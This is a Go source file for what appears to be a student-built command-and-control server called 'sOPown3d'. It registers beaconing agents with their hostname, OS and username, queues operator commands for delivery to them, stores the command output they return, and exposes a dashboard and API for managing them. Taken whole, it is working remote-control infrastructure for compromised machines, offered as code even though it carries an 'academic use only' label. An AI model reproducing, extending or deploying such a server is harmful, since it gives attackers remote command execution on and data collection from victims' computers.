package main

import (
	"context"
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"time"

	"sOPown3d/server/config"
	"sOPown3d/server/database"
	"sOPown3d/server/logger"
	"sOPown3d/server/storage"
	"sOPown3d/server/tasks"
	"sOPown3d/pkg/shared"

	"github.com/gorilla/websocket"
)

var (
	pendingCommands  = make(map[string]shared.Command)
	lastCommandSent  = make(map[string]shared.Command) // Track last command sent to each agent
	templates        *template.Template
	log              *logger.Logger
	store            storage.Storage
	activityChecker  *tasks.ActivityChecker
	cleanupScheduler *tasks.CleanupScheduler
	connectionCount = 0

	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true }, // TODO : Wtf is a websocket Upgrader
	}
	wsClients = make(map[string]*websocket.Conn) // init du client pour le webSocket
)

func init() {
	templates = template.Must(template.ParseGlob("templates/*.html"))
}

func main() {
	// Load configuration
	cfg, err := config.Load()
	if err != nil {
		fmt.Printf("Failed to load config: %v\n", err)
		return
	}

	// Initialize logger
	log = logger.New(cfg.Logging.Level)

	log.Info(logger.CategoryStartup, "=== sOPown3d C2 Server ===")
	log.Info(logger.CategoryStartup, "Usage académique uniquement")
	log.Info(logger.CategoryStartup, "")

	// Try to connect to PostgreSQL
	var db *database.DB
	var primaryStorage storage.Storage

	db, err = database.Connect(&cfg.Database, log)
	if err != nil {
		log.Warn(logger.CategoryWarning, "PostgreSQL unavailable: %v", err)
		log.Info(logger.CategoryStorage, "Using in-memory storage (data will be synced when DB is available)")
	} else {
		// Run migrations
		log.Info(logger.CategoryDatabase, "Running database migrations...")
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		if err := db.RunMigrations(ctx); err != nil {
			log.Error(logger.CategoryError, "Failed to run migrations: %v", err)
			cancel()
			return
		}
		cancel()

		// Create PostgreSQL storage
		primaryStorage = storage.NewPostgresStorage(db, log)
	}

	// Create fallback storage
	fallbackStorage := storage.NewMemoryStorage(log)

	// Create resilient storage (handles automatic fallback)
	if primaryStorage != nil {
		store = storage.NewResilientStorage(primaryStorage, fallbackStorage, log)
	} else {
		store = fallbackStorage
		log.Info(logger.CategoryStorage, "Running in in-memory mode only")
	}

	// Start background tasks
	activityChecker = tasks.NewActivityChecker(store, log, cfg.Features.AgentInactiveThresholdMinutes)
	activityChecker.Start()

	if cfg.Features.EnableAutoCleanup {
		cleanupScheduler = tasks.NewCleanupScheduler(store, log, cfg.Features.RetentionDays, cfg.Features.CleanupHour)
		cleanupScheduler.Start()
	}

	// Setup HTTP routes
	http.HandleFunc("/beacon", handleBeacon)
	http.HandleFunc("/ingest", handleIngest)
	http.HandleFunc("/command", handleSendCommand)
	http.HandleFunc("/websocket", handleWebSocket)
	http.HandleFunc("/", handleDashboard)

	// API routes (will be implemented in Phase 6)
	http.HandleFunc("/api/agents", handleAPIAgents)
	http.HandleFunc("/api/agents/", handleAPIAgentDetails) // This handles /api/agents/:id and /api/agents/:id/history
	http.HandleFunc("/api/executions", handleAPIExecutions)
	http.HandleFunc("/api/stats", handleAPIStats)

	serverAddr := fmt.Sprintf("%s:%s", cfg.Server.Host, cfg.Server.Port)
	log.Info(logger.CategoryAPI, "Server listening on http://%s", serverAddr)
	log.Info(logger.CategoryBackground, "Background tasks started (activity checker, cleanup scheduler)")
	log.Info(logger.CategorySuccess, "Ready to receive agent beacons")
	log.Info(logger.CategoryStartup, "")

	err = http.ListenAndServe(serverAddr, nil)
	if err != nil {
		log.Error(logger.CategoryError, "Server error: %v", err)
	}
}

func handleDashboard(w http.ResponseWriter, _ *http.Request) {
	data := shared.DashboardData{
		AgentInfo:    "AgentID à voir comment recupérer dynamiquement", // Nul
		DefaultAgent: "Nicolass-MacBook-Pro.local",
	}

	err := templates.ExecuteTemplate(w, "dashboard.html", data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		log.Error(logger.CategoryError, "Template error: %v", err)
		fmt.Println("Erreur template:", err)
		return
	}
}

func handleBeacon(w http.ResponseWriter, request *http.Request) {
	if request.Method != "POST" {
		http.Error(w, "POST seulement", 405)
		return
	}

	var agentInfo shared.AgentInfo
	err := json.NewDecoder(request.Body).Decode(&agentInfo)
	if err != nil {
		log.Error(logger.CategoryError, "Beacon JSON decode error: %v", err)
		w.WriteHeader(400)
		return
	}

	agentID := agentInfo.Hostname

	// Log beacon
	log.Info(logger.CategoryBeacon, "Beacon received: agent=%s os=%s", agentID, agentInfo.OS)

	// Save agent info to storage
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	agent := &storage.Agent{
		AgentID:  agentID,
		Hostname: agentInfo.Hostname,
		OS:       agentInfo.OS,
		Username: agentInfo.Username,
		LastSeen: time.Now(),
		IsActive: true,
	}

	if err := store.UpsertAgent(ctx, agent); err != nil {
		log.Error(logger.CategoryError, "Failed to save agent: %v", err)
		// Continue anyway - don't block beacon response
	} else {
		log.Info(logger.CategoryStorage, "Agent '%s' info updated", agentID)
	}

	// Check for pending commands
	if cmd, exists := pendingCommands[agentID]; exists {
		json.NewEncoder(w).Encode(cmd)
		delete(pendingCommands, agentID)
		lastCommandSent[agentID] = cmd // Track this command for when result comes back
		log.Info(logger.CategoryCommand, "Command delivered to agent '%s': action=%s", agentID, cmd.Action)
	} else {
		w.WriteHeader(200)
		w.Write([]byte("{}"))
	}
}

func handleSendCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "POST seulement", 405)
		return
	}

	var cmd shared.Command
	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
		http.Error(w, err.Error(), 400)
		return
	}

	pendingCommands[cmd.ID] = cmd
	log.Info(logger.CategoryCommand, "Command queued: agent=%s action=%s payload=%s", cmd.ID, cmd.Action, cmd.Payload)

	w.Write([]byte(`{"status": "ok"}`))
}

func handleIngest(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "POST seulement", 405)
		return
	}

	// We need to know which agent this is from
	// For now, we'll get it from query parameter or header
	// Better: restructure the agent to send {agent_id, output} as JSON
	agentID := r.URL.Query().Get("agent_id")

	var output string
	if err := json.NewDecoder(r.Body).Decode(&output); err != nil {
		http.Error(w, err.Error(), 400)
		return
	}

	log.Info(logger.CategoryExecution, "Execution result received: %d bytes", len(output))

	// Save execution to storage if we know which agent and command
	if agentID != "" {
		if cmd, exists := lastCommandSent[agentID]; exists {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			exec := &storage.Execution{
				AgentID:        agentID,
				CommandAction:  cmd.Action,
				CommandPayload: cmd.Payload,
				Output:         output,
				ExecutedAt:     time.Now(),
			}

			if err := store.SaveExecution(ctx, exec); err != nil {
				log.Error(logger.CategoryError, "Failed to save execution: %v", err)
			} else {
				log.Info(logger.CategoryStorage, "Execution saved: agent=%s action=%s output=%d bytes",
					agentID, cmd.Action, len(output))
			}

			// Clear the last command
			delete(lastCommandSent, agentID)
		}
	}

	w.Write([]byte(output))
	fmt.Printf("> %s\n", output)
}

// API Endpoints

// GET /api/agents - List all agents
func handleAPIAgents(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "GET" {
		http.Error(w, "GET only", http.StatusMethodNotAllowed)
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	agents, err := store.ListAgents(ctx)
	if err != nil {
		log.Error(logger.CategoryError, "Failed to list agents: %v", err)
		http.Error(w, "Failed to retrieve agents", http.StatusInternalServerError)
		return
	}

	response := map[string]interface{}{
		"agents": agents,
		"total":  len(agents),
	}

	json.NewEncoder(w).Encode(response)
}

// GET /api/agents/:id or /api/agents/:id/history
func handleAPIAgentDetails(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "GET" {
		http.Error(w, "GET only", http.StatusMethodNotAllowed)
		return
	}

	// Parse URL path: /api/agents/:id or /api/agents/:id/history
	path := r.URL.Path
	agentID := ""
	isHistory := false

	// Extract agent ID from path
	if len(path) > len("/api/agents/") {
		remainder := path[len("/api/agents/"):]
		if len(remainder) > 0 {
			// Check if it ends with /history
			if len(remainder) > 8 && remainder[len(remainder)-8:] == "/history" {
				agentID = remainder[:len(remainder)-8]
				isHistory = true
			} else {
				agentID = remainder
			}
		}
	}

	if agentID == "" {
		http.Error(w, "Agent ID required", http.StatusBadRequest)
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if isHistory {
		// Get execution history
		limit := 50
		offset := 0

		// Parse query parameters
		if limitStr := r.URL.Query().Get("limit"); limitStr != "" {
			fmt.Sscanf(limitStr, "%d", &limit)
		}
		if offsetStr := r.URL.Query().Get("offset"); offsetStr != "" {
			fmt.Sscanf(offsetStr, "%d", &offset)
		}

		executions, total, err := store.GetExecutionHistory(ctx, agentID, limit, offset)
		if err != nil {
			log.Error(logger.CategoryError, "Failed to get execution history: %v", err)
			http.Error(w, "Failed to retrieve history", http.StatusInternalServerError)
			return
		}

		response := map[string]interface{}{
			"agent_id":   agentID,
			"executions": executions,
			"total":      total,
			"limit":      limit,
			"offset":     offset,
		}

		json.NewEncoder(w).Encode(response)
	} else {
		// Get agent details
		agent, err := store.GetAgent(ctx, agentID)
		if err != nil {
			log.Error(logger.CategoryError, "Failed to get agent: %v", err)
			http.Error(w, "Agent not found", http.StatusNotFound)
			return
		}

		// Get execution count
		executions, total, err := store.GetExecutionHistory(ctx, agentID, 0, 0)
		if err != nil {
			log.Error(logger.CategoryError, "Failed to count executions: %v", err)
			total = 0
		}
		_ = executions // Not used, just getting count

		response := map[string]interface{}{
			"agent_id":         agent.AgentID,
			"hostname":         agent.Hostname,
			"os":               agent.OS,
			"username":         agent.Username,
			"first_seen":       agent.FirstSeen,
			"last_seen":        agent.LastSeen,
			"is_active":        agent.IsActive,
			"total_executions": total,
		}

		json.NewEncoder(w).Encode(response)
	}
}

// GET /api/executions - List all executions with filters
func handleAPIExecutions(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "GET" {
		http.Error(w, "GET only", http.StatusMethodNotAllowed)
		return
	}

	// Parse query parameters
	filters := storage.ExecutionFilters{
		AgentID: r.URL.Query().Get("agent_id"),
		Action:  r.URL.Query().Get("action"),
		Limit:   100,
		Offset:  0,
	}

	if limitStr := r.URL.Query().Get("limit"); limitStr != "" {
		fmt.Sscanf(limitStr, "%d", &filters.Limit)
	}
	if offsetStr := r.URL.Query().Get("offset"); offsetStr != "" {
		fmt.Sscanf(offsetStr, "%d", &filters.Offset)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	executions, total, err := store.ListExecutions(ctx, filters)
	if err != nil {
		log.Error(logger.CategoryError, "Failed to list executions: %v", err)
		http.Error(w, "Failed to retrieve executions", http.StatusInternalServerError)
		return
	}

	response := map[string]interface{}{
		"executions": executions,
		"total":      total,
		"limit":      filters.Limit,
		"offset":     filters.Offset,
	}

	json.NewEncoder(w).Encode(response)
}

// GET /api/stats - Get system statistics
func handleAPIStats(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "GET" {
		http.Error(w, "GET only", http.StatusMethodNotAllowed)
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	stats, err := store.GetStats(ctx)
	if err != nil {
		log.Error(logger.CategoryError, "Failed to get stats: %v", err)
		http.Error(w, "Failed to retrieve statistics", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(stats)
}
